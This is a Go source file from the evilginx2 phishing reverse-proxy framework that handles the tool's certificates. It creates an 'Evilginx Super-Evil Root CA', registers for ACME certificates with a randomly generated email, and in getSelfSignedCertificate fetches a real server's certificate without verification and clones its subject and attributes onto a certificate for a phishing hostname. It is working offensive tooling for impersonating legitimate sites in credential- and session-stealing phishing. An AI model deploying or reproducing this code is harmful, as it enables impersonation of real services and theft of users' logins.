package core

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/caddyserver/certmagic"
)

type CertDb struct {
	cache_dir string
	magic     *certmagic.Config
	cfg       *Config
	ns        *Nameserver
	caCert    tls.Certificate
	tlsCache  map[string]*tls.Certificate
}

func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
	os.Setenv("XDG_DATA_HOME", cache_dir)

	o := &CertDb{
		cache_dir: cache_dir,
		cfg:       cfg,
		ns:        ns,
		tlsCache:  make(map[string]*tls.Certificate),
	}

	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
		return nil, err
	}

	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = o.GetEmail()

	err := o.generateCertificates()
	if err != nil {
		return nil, err
	}
	err = o.reloadCertificates()
	if err != nil {
		return nil, err
	}

	o.magic = certmagic.NewDefault()

	return o, nil
}

func (o *CertDb) GetEmail() string {
	var email string
	fn := filepath.Join(o.cache_dir, "email.txt")

	data, err := ReadFromFile(fn)
	if err != nil {
		email = strings.ToLower(GenRandomString(3) + "@" + GenRandomString(6) + ".com")
		if SaveToFile([]byte(email), fn, 0600) != nil {
			log.Error("saving email error: %s", err)
		}
	} else {
		email = strings.TrimSpace(string(data))
	}
	return email
}

func (o *CertDb) generateCertificates() error {
	var key *rsa.PrivateKey

	pkey, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "private.key"))
	if err != nil {
		pkey, err = ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
	}

	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(o.cache_dir, "*"))

		key, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("private key generation failed")
		}
		pkey = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
		if err != nil {
			return err
		}
	} else {
		block, _ := pem.Decode(pkey)
		if block == nil {
			return fmt.Errorf("private key is corrupted")
		}

		key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return err
		}
	}

	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
	if err != nil {
		notBefore := time.Now()
		aYear := time.Duration(10*365*24) * time.Hour
		notAfter := notBefore.Add(aYear)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return err
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"Evilginx Signature Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "Evilginx Super-Evil Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
			IsCA:                  true,
		}

		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
		if err != nil {
			return err
		}
		ca_cert = pem.EncodeToMemory(&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert,
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
		if err != nil {
			return err
		}
	}

	o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
	if err != nil {
		return err
	}
	return nil
}

func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), t)
	err := o.magic.ManageSync(ctx, hosts)
	cancel()
	return err
}

func (o *CertDb) setUnmanagedSync(verbose bool) error {
	sitesDir := filepath.Join(o.cache_dir, "sites")

	files, err := os.ReadDir(sitesDir)
	if err != nil {
		return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
	}

	for _, f := range files {
		if f.IsDir() {
			certDir := filepath.Join(sitesDir, f.Name())

			certFiles, err := os.ReadDir(certDir)
			if err != nil {
				return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
			}

			var certPath, keyPath string

			var pemCnt, crtCnt, keyCnt int
			for _, cf := range certFiles {
				//log.Debug("%s", cf.Name())
				if !cf.IsDir() {
					switch strings.ToLower(filepath.Ext(cf.Name())) {
					case ".pem":
						pemCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "fullchain.pem" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "privkey.pem" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					case ".crt":
						crtCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
					case ".key":
						keyCnt += 1
						if keyPath == "" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					}
				}
			}
			if pemCnt > 0 && crtCnt > 0 {
				if verbose {
					log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
				}
				continue
			}
			if certPath == "" {
				if verbose {
					log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
				}
				continue
			}
			if keyPath == "" {
				if verbose {
					log.Warning("cert_db: not a single private key found in directory: %s", certDir)
				}
				continue
			}

			log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
			ctx := context.Background()
			_, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
			if err != nil {
				if verbose {
					log.Error("cert_db: failed to load certificate key-pair: %v", err)
				}
				continue
			}
		}
	}
	return nil
}

func (o *CertDb) reloadCertificates() error {
	// TODO: load private certificates from disk
	return nil
}

func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)

	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	state := conn.ConnectionState()

	return state.PeerCertificates[0], nil
}

func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	var x509ca *x509.Certificate
	var template x509.Certificate

	cert, ok := o.tlsCache[host]
	if ok {
		return cert, nil
	}

	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
		return
	}

	if phish_host == "" {
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template = x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
			NotBefore:             time.Now(),
			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			DNSNames:              []string{host},
			BasicConstraintsValid: true,
		}
		template.Subject.CommonName = host
	} else {
		srvCert, err := o.getTLSCertificate(host, port)
		if err != nil {
			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
		} else {
			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
			if err != nil {
				return nil, err
			}

			template = x509.Certificate{
				SerialNumber:          serialNumber,
				Issuer:                x509ca.Subject,
				Subject:               srvCert.Subject,
				NotBefore:             srvCert.NotBefore,
				NotAfter:              time.Now().Add(time.Hour * 24 * 180),
				KeyUsage:              srvCert.KeyUsage,
				ExtKeyUsage:           srvCert.ExtKeyUsage,
				IPAddresses:           srvCert.IPAddresses,
				DNSNames:              []string{phish_host},
				BasicConstraintsValid: true,
			}
			template.Subject.CommonName = phish_host
		}
	}

	var pkey *rsa.PrivateKey
	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
		return
	}

	var derBytes []byte
	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
		return
	}

	cert = &tls.Certificate{
		Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
		PrivateKey:  pkey,
	}

	o.tlsCache[host] = cert
	return cert, nil
}
